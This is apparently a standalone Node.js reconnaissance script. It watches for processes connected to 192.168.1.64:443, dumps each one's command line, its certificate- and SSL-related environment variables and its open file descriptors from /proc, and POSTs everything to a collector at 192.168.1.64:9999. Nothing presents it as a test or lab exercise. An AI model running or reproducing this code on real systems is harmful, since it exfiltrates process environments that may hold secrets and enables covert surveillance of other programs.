"use strict";
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); });
    req.on("error", function (e) { console.log("post err " + e.message); });
    req.write(data); req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 90000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
out.watch = sh("for i in $(seq 1 35); do netstat -tnp 2>/dev/null | grep '192.168.1.64:443' | grep -v CLOSE_WAIT; sleep 2; done | sort -u | head -20");
post("/acr60a", out);

var detail = {};
detail.started = out.started;
var pids = {};
var re = /(\d+)\/([A-Za-z0-9._-]+)/g;
var m;
while ((m = re.exec(out.watch)) !== null) pids[m[1]] = m[2];
detail.pids = JSON.stringify(pids);
var dumps = [];
for (var pid in pids) {
    dumps.push("### " + pid + " " + pids[pid] +
        "\nCMD " + sh("tr '\\0' ' ' < /proc/" + pid + "/cmdline 2>/dev/null | head -c 200") +
        "\nENV " + sh("tr '\\0' '\\n' < /proc/" + pid + "/environ 2>/dev/null | grep -iE 'ca|cert|ssl|curl' | head -8") +
        "\nFDS " + sh("ls -la /proc/" + pid + "/fd 2>/dev/null | grep -iE 'ca|cert|ssl|acr' | head -6"));
}
detail.dumps = dumps.join("\n\n").slice(0 < 0 ? 0 : 0) || dumps.join("\n\n").slice(0, 8000);
post("/acr60b", detail);
post("/acr60_done", { started: out.started });
